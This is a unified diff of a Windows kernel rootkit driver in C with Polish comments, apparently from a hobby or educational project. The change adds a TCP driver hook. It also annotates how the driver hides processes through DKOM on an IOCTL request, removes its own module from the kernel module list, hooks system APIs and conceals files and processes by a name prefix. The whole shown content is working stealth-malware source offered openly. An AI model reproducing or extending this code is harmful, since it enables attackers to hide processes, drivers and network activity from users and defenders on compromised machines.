@@ -4,6 +4,7 @@
 #include "rk_Tools.h"
 #include "rk_DKOM.h"
 #include "rk_Hook.h"
+#include "rk_Tcpip.h"
 
 #define		FILE_DEVICE_ROOTKIT_DRIVER	FILE_DEVICE_UNKNOWN
 
@@ -19,7 +20,6 @@ PDEVICE_OBJECT	gp_DeviceObject = NULL;
 // offsety oraz indeksy wybrane dla aktualnego systemu
 NTOSKRNL_OFFSETS    offsets;
 API_INDEXES         currentAPI;
-
 
 // wzory, ktore wyszukujemy w operacjach ukrywania plikow , procesow
 UNICODE_STRING hidePrefixW;
@@ -40,8 +40,6 @@ NTSTATUS DispatchGeneral(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING RegistryPath);
 BOOLEAN SetupOffsets(ULONG processNameOffset);
 
-__declspec(dllimport) ULONG NtBuildNumber;
-
 /*
 *  Procedura jest callbackiem, wywolywanym przy kazdym utworzeniu badz zamknieciu procesu.
 *  Rejestracja procedury odbywa sie przez wywolanie PsSetCreateProcessNotifyRoutine.
@@ -57,11 +55,13 @@ VOID ProcessNotify(
 {
     PEPROCESS eproc = NULL;
     PCHAR processName = NULL;
-    
+    ULONG len = 0;    
     if (bCreate) {
+       // znalezienie bloku EPROCESS po pid - bardzo przydatna funkcja
+       // inaczej trzeba by np przeszukiwac liste ActiveProcessLinks 
+       // zeby znalezc proces o okreslonym pid
        PsLookupProcessByProcessId( hProcessId , &eproc );
        if (eproc != NULL) {
-          ULONG len = 0;
           len = strlen(rulingProcess);
   		  processName = (PCHAR) ( (ULONG)eproc + offsets.processName);
   		  if (processName!= NULL) {
@@ -72,7 +72,7 @@ VOID ProcessNotify(
                   }
               }
           }
-       }
+       } // eproc!=NULL
     }
         
     return;    
@@ -129,16 +129,23 @@ VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
 
 	DbgPrint("rootkit: wszedlem w OnUnload: %x \n",DriverObject);
 	
+	// odhookowanie systemu
 	UnHookApis();
+	
+	DbgPrint("rootkit: zwalniam TCP hook\n");
+	UninstallTCPDriverHook();
 
-	//Delete symbolic link
+	// zwolnienie polaczen symbolicznych
 	RtlInitUnicodeString( &symbolicLink, ROOTKIT_WIN32_DEV_NAME );
 	IoDeleteSymbolicLink( &symbolicLink );
 
+    // usuwam urzadzenie sterownika sluzace do komunikacji z user-mode
 	IoDeleteDevice(gp_DeviceObject);
 
+    // wyrejestrowanie callbacka zdarzen dotyczacych procesow    
 	PsSetCreateProcessNotifyRoutine( ProcessNotify  , TRUE );
 
+    // zwalniamy wczesniej zaalokowane wzorce
     if ( hidePrefixA )
     	ExFreePool( hidePrefixA );
    	if ( rulingProcess )
@@ -169,7 +176,8 @@ NTSTATUS  Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 	switch (controlCode) 
 	{
 	case IOCTL_HIDE_PROCESS:
-		if (inputSize == sizeof(ULONG)) {
+        // dostalismy zadanie ukrycia procesu
+        if (inputSize == sizeof(ULONG)) {
 			DKOM_OnProcessHide( *(ULONG*)pInputBuffer );
 		}
 		break;
@@ -200,13 +208,10 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	NTSTATUS		status = STATUS_SUCCESS;
 	UNICODE_STRING	deviceName;
 	UNICODE_STRING	symbolicName;
-	ULONG i;
-	ULONG m,j,k;
-	ULONG procNotifyCount;
     ULONG procNameOffset;
+	ULONG i;    
 
 	DbgPrint("rootkit: Wszedlem w DriverEntry: %x\n",driverObject);
-	DbgPrint("rootkit: Demo version ,please register :P\n");
 
 	driverObject->DriverUnload  = OnUnload;
 
@@ -235,11 +240,13 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 								0,
 								TRUE,							// TRUE -> tylko jedno otwarcie tego urzadzenia naraz
 								&driverObject->DeviceObject);
-
+								
 	if (status!=STATUS_SUCCESS) {
 		DbgPrint("rootkit: IoCreateDeviceFailed\n");
-		return status;
+		return status;		
 	}
+	
+	gp_DeviceObject = driverObject->DeviceObject;									
 
 	status = IoCreateSymbolicLink( &symbolicName, &deviceName );
 	if (status!=STATUS_SUCCESS) {
@@ -268,8 +275,6 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	// ciag ktory zawiera wzor do ukrycia, wersja UNICODE   
 	RtlInitUnicodeString( &hidePrefixW, L"demo");
 
-	gp_DeviceObject = driverObject->DeviceObject;
-
     // wykorzystanie metody zaproponowanej przez Sysinternalsow do znalezienia 
     // offsetu do nazwy procesu wzgledem poczatku struktury EPROCESS
 	procNameOffset  = GetProcessNameOffset();
@@ -283,6 +288,9 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	g_ModuleListBegin =  (PMODULE_ENTRY)DKOM_GetModuleListBegin(driverObject);
 
 	DKOM_HideRootkitModule();
+	
+	DbgPrint("rootkit: ustawiam TCP hook\n");
+	InstallTCPDriverHook();
 
 	HookApis();
 	
